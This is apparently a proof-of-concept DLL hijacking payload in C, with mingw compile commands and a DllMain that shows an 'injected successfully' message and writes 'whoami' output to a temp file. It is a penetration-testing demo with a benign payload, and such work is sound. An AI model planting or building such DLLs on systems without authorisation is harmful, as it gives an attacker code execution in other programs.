//  ┓      ┓       ┓  ┓   
// ┏┫┏┓┓┏┏┓┃┏┓┏┓┏┓┏┫  ┣┓┓┏
// ┗┻┗ ┗┛┗ ┗┗┛┣┛┗ ┗┻  ┗┛┗┫
//            ┛          ┛
// ┳┓┏┓┓┏┏┓┏┓┓┏┓          
// ┃┃ ┫┣┫┣┫┃ ┃┫           
// ┻┛┗┛┛┗┛┗┗┛┛┗┛          
// For best results use this script on Linux machine for compile
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijack.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o hijack.dll

#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        MessageBoxA(0, "DLL injected successfully!", "VulnCorp", MB_OK);
        
        system("cmd.exe /c whoami > C:\\Windows\\Temp\\dll_hijack_result.txt");
    }
    return TRUE;
}